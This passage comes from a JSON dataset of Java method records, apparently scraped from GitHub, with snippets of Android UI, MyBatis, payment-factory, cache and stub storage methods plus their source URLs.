"ProcessadoresPagamentoFactory", "params": ["AutorizadorDeTransacoes"], "throws": null, "modifiers": ["public"], "return_type": "ProcessadorPagamento", "snippet": "\tpublic ProcessadorPagamento criaRede(AutorizadorDeTransacoes autorizadorDeTransacoes) {\n\t\treturn new ProcessadorRede(autorizadorDeTransacoes); \n\t}", "url": "https://raw.githubusercontent.com/asouza/implementacao-teste-ifood-pagamento-ddd-da-massa/master/src/main/java/com/deveficiente/testepagamentoifood/pagamento/processadores/ProcessadoresPagamentoFactory.java", "stars": "9", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30707, "method_name": "main", "class_name": "Sortierung", "params": ["String"], "throws": null, "modifiers": ["public", "static"], "return_type": "void", "snippet": "    public static void main(String[] args) {\n        // Eingabe:\n        int[] zuSortieren = {12, 14, 125, 1, 9, 28, 3};\n        // Ausgabe: Sortierte Liste\n    }", "url": "https://raw.githubusercontent.com/unterstein/dhbw-java-2020/master/src/Sortierung.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30708, "method_name": "getPullToRefreshScrollDirection", "class_name": "PullToRefreshGridView", "params": [], "throws": null, "modifiers": ["final", "public"], "return_type": "Orientation", "snippet": "\tpublic final Orientation getPullToRefreshScrollDirection() {\n\t\treturn Orientation.VERTICAL;\n\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/library/src/com/handmark/pulltorefresh/library/PullToRefreshGridView.java", "stars": "74", "class_props": {"extends": "PullToRefreshAdapterViewBase", "implements": null, "modifiers": ["public"]}}, {"id": 30709, "method_name": "createRefreshableView", "class_name": "PullToRefreshGridView", "params": ["Context", "AttributeSet"], "throws": null, "modifiers": ["final", "protected"], "return_type": "GridView", "snippet": "\tprotected final GridView createRefreshableView(Context context, AttributeSet attrs) {\n\t\tfinal GridView gv;\n\t\tif (VERSION.SDK_INT >= VERSION_CODES.GINGERBREAD) {\n\t\t\tgv = new InternalGridViewSDK9(context, attrs);\n\t\t} else {\n\t\t\tgv = new InternalGridView(context, attrs);\n\t\t}\n\n\t\t// Use Generated ID (from res/values/ids.xml)\n\t\tgv.setId(R.id.gridview);\n\t\treturn gv;\n\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/library/src/com/handmark/pulltorefresh/library/PullToRefreshGridView.java", "stars": "74", "class_props": {"extends": "PullToRefreshAdapterViewBase", "implements": null, "modifiers": ["public"]}}, {"id": 30710, "method_name": "setEmptyView", "class_name": "InternalGridView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void setEmptyView(View emptyView) {\n\t\t\tPullToRefreshGridView.this.setEmptyView(emptyView);\n\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/library/src/com/handmark/pulltorefresh/library/PullToRefreshGridView.java", "stars": "74", "class_props": {"extends": "GridView", "implements": ["EmptyViewMethodAccessor"], "modifiers": []}}, {"id": 30711, "method_name": "setEmptyViewInternal", "class_name": "InternalGridView", "params": ["View"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\t\tpublic void setEmptyViewInternal(View emptyView) {\n\t\t\tsuper.setEmptyView(emptyView);\n\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/library/src/com/handmark/pulltorefresh/library/PullToRefreshGridView.java", "stars": "74", "class_props": {"extends": "GridView", "implements": ["EmptyViewMethodAccessor"], "modifiers": []}}, {"id": 30712, "method_name": "overScrollBy", "class_name": "InternalGridViewSDK9", "params": ["int", "int", "int", "int", "int", "int", "int", "int", "boolean"], "throws": null, "modifiers": ["protected"], "return_type": "boolean", "snippet": "\t\tprotected boolean overScrollBy(int deltaX, int deltaY, int scrollX, int scrollY, int scrollRangeX,\n\t\t\t\tint scrollRangeY, int maxOverScrollX, int maxOverScrollY, boolean isTouchEvent) {\n\n\t\t\tfinal boolean returnValue = super.overScrollBy(deltaX, deltaY, scrollX, scrollY, scrollRangeX,\n\t\t\t\t\tscrollRangeY, maxOverScrollX, maxOverScrollY, isTouchEvent);\n\n\t\t\t// Does all of the hard work...\n\t\t\tOverscrollHelper.overScrollBy(PullToRefreshGridView.this, deltaX, scrollX, deltaY, scrollY, isTouchEvent);\n\n\t\t\treturn returnValue;\n\t\t}", "url": "https://raw.githubusercontent.com/harshalbenake/hbworkspace1-100/master/pulltorefresh%20and%20dragndrop%20to%20gridview/library/src/com/handmark/pulltorefresh/library/PullToRefreshGridView.java", "stars": "74", "class_props": {"extends": "InternalGridView", "implements": null, "modifiers": ["final"]}}, {"id": 30713, "method_name": "findViewById", "class_name": "ViewFinder", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "View", "snippet": "    public View findViewById(int viewId) {\n        return activity != null ? activity.findViewById(viewId) : view.findViewById(viewId);\n    }", "url": "https://raw.githubusercontent.com/itliuhao/haoLabrary/master/baselibrary/src/main/java/com/wander/baselibrary/ioc/ViewFinder.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30714, "method_name": "getASMTransformerClass", "class_name": "MixinLoader", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String[] getASMTransformerClass() {\n\t\treturn new String[0];\n\t}", "url": "https://raw.githubusercontent.com/2b2t-Utilities/2b2t-Utilities/master/src/main/java/me/tigermouthbear/utilities/mixin/MixinLoader.java", "stars": "2", "class_props": {"extends": null, "implements": ["IFMLLoadingPlugin"], "modifiers": ["public"]}}, {"id": 30715, "method_name": "getModContainerClass", "class_name": "MixinLoader", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getModContainerClass() {\n\t\treturn null;\n\t}", "url": "https://raw.githubusercontent.com/2b2t-Utilities/2b2t-Utilities/master/src/main/java/me/tigermouthbear/utilities/mixin/MixinLoader.java", "stars": "2", "class_props": {"extends": null, "implements": ["IFMLLoadingPlugin"], "modifiers": ["public"]}}, {"id": 30716, "method_name": "getSetupClass", "class_name": "MixinLoader", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getSetupClass() {\n\t\treturn null;\n\t}", "url": "https://raw.githubusercontent.com/2b2t-Utilities/2b2t-Utilities/master/src/main/java/me/tigermouthbear/utilities/mixin/MixinLoader.java", "stars": "2", "class_props": {"extends": null, "implements": ["IFMLLoadingPlugin"], "modifiers": ["public"]}}, {"id": 30717, "method_name": "injectData", "class_name": "MixinLoader", "params": ["Map<String,Object>"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void injectData(Map<String, Object> data) {\n\t}", "url": "https://raw.githubusercontent.com/2b2t-Utilities/2b2t-Utilities/master/src/main/java/me/tigermouthbear/utilities/mixin/MixinLoader.java", "stars": "2", "class_props": {"extends": null, "implements": ["IFMLLoadingPlugin"], "modifiers": ["public"]}}, {"id": 30718, "method_name": "getAccessTransformerClass", "class_name": "MixinLoader", "params": [], "throws": null, "modifiers": ["public"], "return_type": "String", "snippet": "\tpublic String getAccessTransformerClass() {\n\t\treturn null;\n\t}", "url": "https://raw.githubusercontent.com/2b2t-Utilities/2b2t-Utilities/master/src/main/java/me/tigermouthbear/utilities/mixin/MixinLoader.java", "stars": "2", "class_props": {"extends": null, "implements": ["IFMLLoadingPlugin"], "modifiers": ["public"]}}, {"id": 30719, "method_name": "exists", "class_name": "VideoManagerJdbcStoragerImpl", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean exists(String deviceId) {\n\t\t// TODO Auto-generated method stub\n\t\treturn false;\n\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/storager/jdbc/VideoManagerJdbcStoragerImpl.java", "stars": "29", "class_props": {"extends": null, "implements": ["IVideoManagerStorager"], "modifiers": ["public"]}}, {"id": 30720, "method_name": "create", "class_name": "VideoManagerJdbcStoragerImpl", "params": ["Device"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean create(Device device) {\n\t\t// TODO Auto-generated method stub\n\t\treturn false;\n\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/storager/jdbc/VideoManagerJdbcStoragerImpl.java", "stars": "29", "class_props": {"extends": null, "implements": ["IVideoManagerStorager"], "modifiers": ["public"]}}, {"id": 30721, "method_name": "update", "class_name": "VideoManagerJdbcStoragerImpl", "params": ["Device"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean update(Device device) {\n\t\t// TODO Auto-generated method stub\n\t\treturn false;\n\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/storager/jdbc/VideoManagerJdbcStoragerImpl.java", "stars": "29", "class_props": {"extends": null, "implements": ["IVideoManagerStorager"], "modifiers": ["public"]}}, {"id": 30722, "method_name": "queryVideoDevice", "class_name": "VideoManagerJdbcStoragerImpl", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "Device", "snippet": "\tpublic Device queryVideoDevice(String deviceId) {\n\t\t// TODO Auto-generated method stub\n\t\treturn null;\n\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/storager/jdbc/VideoManagerJdbcStoragerImpl.java", "stars": "29", "class_props": {"extends": null, "implements": ["IVideoManagerStorager"], "modifiers": ["public"]}}, {"id": 30723, "method_name": "queryVideoDeviceList", "class_name": "VideoManagerJdbcStoragerImpl", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "List<Device>", "snippet": "\tpublic List<Device> queryVideoDeviceList(String[] deviceIds) {\n\t\t// TODO Auto-generated method stub\n\t\treturn null;\n\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/storager/jdbc/VideoManagerJdbcStoragerImpl.java", "stars": "29", "class_props": {"extends": null, "implements": ["IVideoManagerStorager"], "modifiers": ["public"]}}, {"id": 30724, "method_name": "delete", "class_name": "VideoManagerJdbcStoragerImpl", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean delete(String deviceId) {\n\t\t// TODO Auto-generated method stub\n\t\treturn false;\n\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/storager/jdbc/VideoManagerJdbcStoragerImpl.java", "stars": "29", "class_props": {"extends": null, "implements": ["IVideoManagerStorager"], "modifiers": ["public"]}}, {"id": 30725, "method_name": "online", "class_name": "VideoManagerJdbcStoragerImpl", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean online(String deviceId) {\n\t\t// TODO Auto-generated method stub\n\t\treturn false;\n\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/storager/jdbc/VideoManagerJdbcStoragerImpl.java", "stars": "29", "class_props": {"extends": null, "implements": ["IVideoManagerStorager"], "modifiers": ["public"]}}, {"id": 30726, "method_name": "outline", "class_name": "VideoManagerJdbcStoragerImpl", "params": ["String"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean outline(String deviceId) {\n\t\t// TODO Auto-generated method stub\n\t\treturn false;\n\t}", "url": "https://raw.githubusercontent.com/swwheihei/wvp/master/src/main/java/com/genersoft/iot/vmp/storager/jdbc/VideoManagerJdbcStoragerImpl.java", "stars": "29", "class_props": {"extends": null, "implements": ["IVideoManagerStorager"], "modifiers": ["public"]}}, {"id": 30727, "method_name": "prepare", "class_name": "RoutingStatementHandler", "params": ["Connection", "Integer"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Statement", "snippet": "  public Statement prepare(Connection connection, Integer transactionTimeout) throws SQLException {\n    return delegate.prepare(connection, transactionTimeout);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/statement/RoutingStatementHandler.java", "stars": "15", "class_props": {"extends": null, "implements": ["StatementHandler"], "modifiers": ["public"]}}, {"id": 30728, "method_name": "parameterize", "class_name": "RoutingStatementHandler", "params": ["Statement"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void parameterize(Statement statement) throws SQLException {\n    delegate.parameterize(statement);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/statement/RoutingStatementHandler.java", "stars": "15", "class_props": {"extends": null, "implements": ["StatementHandler"], "modifiers": ["public"]}}, {"id": 30729, "method_name": "batch", "class_name": "RoutingStatementHandler", "params": ["Statement"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "void", "snippet": "  public void batch(Statement statement) throws SQLException {\n    delegate.batch(statement);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/statement/RoutingStatementHandler.java", "stars": "15", "class_props": {"extends": null, "implements": ["StatementHandler"], "modifiers": ["public"]}}, {"id": 30730, "method_name": "update", "class_name": "RoutingStatementHandler", "params": ["Statement"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "int", "snippet": "  public int update(Statement statement) throws SQLException {\n    return delegate.update(statement);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/statement/RoutingStatementHandler.java", "stars": "15", "class_props": {"extends": null, "implements": ["StatementHandler"], "modifiers": ["public"]}}, {"id": 30731, "method_name": "query", "class_name": "RoutingStatementHandler", "params": ["Statement", "ResultHandler"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "List<E>", "snippet": "  public <E> List<E> query(Statement statement, ResultHandler resultHandler) throws SQLException {\n    return delegate.query(statement, resultHandler);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/statement/RoutingStatementHandler.java", "stars": "15", "class_props": {"extends": null, "implements": ["StatementHandler"], "modifiers": ["public"]}}, {"id": 30732, "method_name": "queryCursor", "class_name": "RoutingStatementHandler", "params": ["Statement"], "throws": ["SQLException"], "modifiers": ["public"], "return_type": "Cursor<E>", "snippet": "  public <E> Cursor<E> queryCursor(Statement statement) throws SQLException {\n    return delegate.queryCursor(statement);\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/statement/RoutingStatementHandler.java", "stars": "15", "class_props": {"extends": null, "implements": ["StatementHandler"], "modifiers": ["public"]}}, {"id": 30733, "method_name": "getBoundSql", "class_name": "RoutingStatementHandler", "params": [], "throws": null, "modifiers": ["public"], "return_type": "BoundSql", "snippet": "  public BoundSql getBoundSql() {\n    return delegate.getBoundSql();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/statement/RoutingStatementHandler.java", "stars": "15", "class_props": {"extends": null, "implements": ["StatementHandler"], "modifiers": ["public"]}}, {"id": 30734, "method_name": "getParameterHandler", "class_name": "RoutingStatementHandler", "params": [], "throws": null, "modifiers": ["public"], "return_type": "ParameterHandler", "snippet": "  public ParameterHandler getParameterHandler() {\n    return delegate.getParameterHandler();\n  }", "url": "https://raw.githubusercontent.com/zjjxxlgb/mybatis2sql/master/src/main/java/org/apache/ibatis/executor/statement/RoutingStatementHandler.java", "stars": "15", "class_props": {"extends": null, "implements": ["StatementHandler"], "modifiers": ["public"]}}, {"id": 30735, "method_name": "contextLoads", "class_name": "ProjetoecommerceApplicationTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "\tvoid contextLoads() {\n\t}", "url": "https://raw.githubusercontent.com/vinicius058/projetoecommerce/master/src/test/java/br/com/ecommerce/projetoecommerce/ProjetoecommerceApplicationTests.java", "stars": "3", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30736, "method_name": "rob", "class_name": "HouseRobber", "params": ["int"], "throws": null, "modifiers": ["public", "static"], "return_type": "int", "snippet": "    public static int rob(int[] arr) {\n        if(arr.length == 0) {\n            return 0;\n        } else if(arr.length == 1) {\n            return arr[0];\n        } else if(arr.length == 2) {\n            return Math.max(arr[0], arr[1]);\n        }\n\n        int[] dp = new int[arr.length];\n        dp[0] = arr[0];\n        dp[1] = Math.max(arr[0], arr[1]);\n\n        for(int i = 2; i < dp.length; i ++) {\n            dp[i] = Math.max(dp[i - 2] + arr[i], dp[i - 1]);\n        }\n\n        return dp[dp.length - 1];\n    }", "url": "https://raw.githubusercontent.com/nishantc1527/LeetCode/master/src/HouseRobber.java", "stars": "1", "class_props": {"extends": null, "implements": null, "modifiers": ["public"]}}, {"id": 30737, "method_name": "showDisableStatus", "class_name": "MyButton", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void showDisableStatus() {\n        setEnabled(false);\n        setBackgroundResource(R.drawable.shape_button_background_disable);\n        setTextColor(ContextCompat.getColor(getContext(), R.color.text_color_disable));\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYAudio-android/master/app/src/main/java/com/mediaroom/ui/MyButton.java", "stars": "2", "class_props": {"extends": "AppCompatButton", "implements": null, "modifiers": ["public"]}}, {"id": 30738, "method_name": "showCloseStatus", "class_name": "MyButton", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void showCloseStatus() {\n        setEnabled(true);\n        setBackgroundResource(R.drawable.shape_button_background_disable);\n        setTextColor(ContextCompat.getColor(getContext(), R.color.button_background));\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYAudio-android/master/app/src/main/java/com/mediaroom/ui/MyButton.java", "stars": "2", "class_props": {"extends": "AppCompatButton", "implements": null, "modifiers": ["public"]}}, {"id": 30739, "method_name": "showOpenStatus", "class_name": "MyButton", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void showOpenStatus() {\n        setEnabled(true);\n        setBackgroundResource(R.drawable.shape_button_background_enable);\n        setTextColor(Color.WHITE);\n    }", "url": "https://raw.githubusercontent.com/Aivacom/JLYAudio-android/master/app/src/main/java/com/mediaroom/ui/MyButton.java", "stars": "2", "class_props": {"extends": "AppCompatButton", "implements": null, "modifiers": ["public"]}}, {"id": 30740, "method_name": "contextLoads", "class_name": "SecurityJwtApplicationTests", "params": [], "throws": null, "modifiers": [], "return_type": "void", "snippet": "    void contextLoads() {\n    }", "url": "https://raw.githubusercontent.com/gavin-yyj/vhr-/master/security-jwt/src/test/java/com/yyj/security/SecurityJwtApplicationTests.java", "stars": "2", "class_props": {"extends": null, "implements": null, "modifiers": []}}, {"id": 30741, "method_name": "onSuggestionClick", "class_name": "SearchView_OnSuggestionListenerImplementor", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onSuggestionClick (int p0)\n\t{\n\t\treturn n_onSuggestionClick (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v7/widget/SearchView_OnSuggestionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 30742, "method_name": "n_onSuggestionClick", "class_name": "SearchView_OnSuggestionListenerImplementor", "params": ["int"], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onSuggestionClick (int p0);\n\n\n\tpublic boolean onSuggestionSelect (int p0)\n\t{\n\t\treturn n_onSuggestionSelect (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v7/widget/SearchView_OnSuggestionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 30743, "method_name": "onSuggestionSelect", "class_name": "SearchView_OnSuggestionListenerImplementor", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean onSuggestionSelect (int p0)\n\t{\n\t\treturn n_onSuggestionSelect (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v7/widget/SearchView_OnSuggestionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 30744, "method_name": "n_onSuggestionSelect", "class_name": "SearchView_OnSuggestionListenerImplementor", "params": ["int"], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_onSuggestionSelect (int p0);\n\n\tprivate java.util.ArrayList refList;\n\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v7/widget/SearchView_OnSuggestionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 30745, "method_name": "monodroidAddReference", "class_name": "SearchView_OnSuggestionListenerImplementor", "params": ["java"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidAddReference (java.lang.Object obj)\n\t{\n\t\tif (refList == null)\n\t\t\trefList = new java.util.ArrayList ();\n\t\trefList.add (obj);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v7/widget/SearchView_OnSuggestionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 30746, "method_name": "monodroidClearReferences", "class_name": "SearchView_OnSuggestionListenerImplementor", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void monodroidClearReferences ()\n\t{\n\t\tif (refList != null)\n\t\t\trefList.clear ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Debug/90/android/src/mono/android/support/v7/widget/SearchView_OnSuggestionListenerImplementor.java", "stars": "2", "class_props": {"extends": "java", "implements": ["mono", "android"], "modifiers": ["public"]}}, {"id": 30747, "method_name": "read", "class_name": "ByteArrayCache", "params": ["byte", "long", "int"], "throws": ["ProxyCacheException"], "modifiers": ["public"], "return_type": "int", "snippet": "    public int read(byte[] buffer, long offset, int length) throws ProxyCacheException {\n        if (offset >= data.length) {\n            return -1;\n        }\n        if (offset > Integer.MAX_VALUE) {\n            throw new IllegalArgumentException(\"Too long offset for memory cache \" + offset);\n        }\n        return new ByteArrayInputStream(data).read(buffer, (int) offset, length);\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-proxy_cache/src/main/java/com/danikula/videocache/ByteArrayCache.java", "stars": "2", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 30748, "method_name": "available", "class_name": "ByteArrayCache", "params": [], "throws": ["ProxyCacheException"], "modifiers": ["public"], "return_type": "long", "snippet": "    public long available() throws ProxyCacheException {\n        return data.length;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-proxy_cache/src/main/java/com/danikula/videocache/ByteArrayCache.java", "stars": "2", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 30749, "method_name": "append", "class_name": "ByteArrayCache", "params": ["byte", "int"], "throws": ["ProxyCacheException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void append(byte[] newData, int length) throws ProxyCacheException {\n        Preconditions.checkNotNull(data);\n        Preconditions.checkArgument(length >= 0 && length <= newData.length);\n\n        byte[] appendedData = Arrays.copyOf(data, data.length + length);\n        System.arraycopy(newData, 0, appendedData, data.length, length);\n        data = appendedData;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-proxy_cache/src/main/java/com/danikula/videocache/ByteArrayCache.java", "stars": "2", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 30750, "method_name": "close", "class_name": "ByteArrayCache", "params": [], "throws": ["ProxyCacheException"], "modifiers": ["public"], "return_type": "void", "snippet": "    public void close() throws ProxyCacheException {\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-proxy_cache/src/main/java/com/danikula/videocache/ByteArrayCache.java", "stars": "2", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 30751, "method_name": "complete", "class_name": "ByteArrayCache", "params": [], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "    public void complete() {\n        completed = true;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-proxy_cache/src/main/java/com/danikula/videocache/ByteArrayCache.java", "stars": "2", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 30752, "method_name": "isCompleted", "class_name": "ByteArrayCache", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "    public boolean isCompleted() {\n        return completed;\n    }", "url": "https://raw.githubusercontent.com/jarryleo/GSYVideoPlayer/master/gsyVideoPlayer-proxy_cache/src/main/java/com/danikula/videocache/ByteArrayCache.java", "stars": "2", "class_props": {"extends": null, "implements": ["Cache"], "modifiers": ["public"]}}, {"id": 30753, "method_name": "isStateful", "class_name": "FrameRenderer_FrameDrawable", "params": [], "throws": null, "modifiers": ["public"], "return_type": "boolean", "snippet": "\tpublic boolean isStateful ()\n\t{\n\t\treturn n_isStateful ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FrameRenderer_FrameDrawable.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 30754, "method_name": "n_isStateful", "class_name": "FrameRenderer_FrameDrawable", "params": [], "throws": null, "modifiers": ["private", "native"], "return_type": "boolean", "snippet": "\tprivate native boolean n_isStateful ();\n\n\n\tpublic int getOpacity ()\n\t{\n\t\treturn n_getOpacity ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FrameRenderer_FrameDrawable.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 30755, "method_name": "getOpacity", "class_name": "FrameRenderer_FrameDrawable", "params": [], "throws": null, "modifiers": ["public"], "return_type": "int", "snippet": "\tpublic int getOpacity ()\n\t{\n\t\treturn n_getOpacity ();\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FrameRenderer_FrameDrawable.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 30756, "method_name": "n_getOpacity", "class_name": "FrameRenderer_FrameDrawable", "params": [], "throws": null, "modifiers": ["private", "native"], "return_type": "int", "snippet": "\tprivate native int n_getOpacity ();\n\n\n\tpublic void draw (android.graphics.Canvas p0)\n\t{\n\t\tn_draw (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FrameRenderer_FrameDrawable.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 30757, "method_name": "draw", "class_name": "FrameRenderer_FrameDrawable", "params": ["android"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void draw (android.graphics.Canvas p0)\n\t{\n\t\tn_draw (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FrameRenderer_FrameDrawable.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 30758, "method_name": "n_draw", "class_name": "FrameRenderer_FrameDrawable", "params": ["android"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_draw (android.graphics.Canvas p0);\n\n\n\tpublic void setAlpha (int p0)\n\t{\n\t\tn_setAlpha (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FrameRenderer_FrameDrawable.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 30759, "method_name": "setAlpha", "class_name": "FrameRenderer_FrameDrawable", "params": ["int"], "throws": null, "modifiers": ["public"], "return_type": "void", "snippet": "\tpublic void setAlpha (int p0)\n\t{\n\t\tn_setAlpha (p0);\n\t}", "url": "https://raw.githubusercontent.com/AtomizedSoul/TulpApp/master/TulpApp.Android/obj/Release/90/android/src/crc643f46942d9dd1fff9/FrameRenderer_FrameDrawable.java", "stars": "2", "class_props": {"extends": "android", "implements": ["mono"], "modifiers": ["public"]}}, {"id": 30760, "method_name": "n_setAlpha", "class_name": "FrameRenderer_FrameDrawable", "params": ["int"], "throws": null, "modifiers": ["private", "native"], "return_type": "void", "snippet": "\tprivate native void n_setAlpha (int p0);\n\n\n\tpublic void setColorFilter (android.graphics.ColorFilter 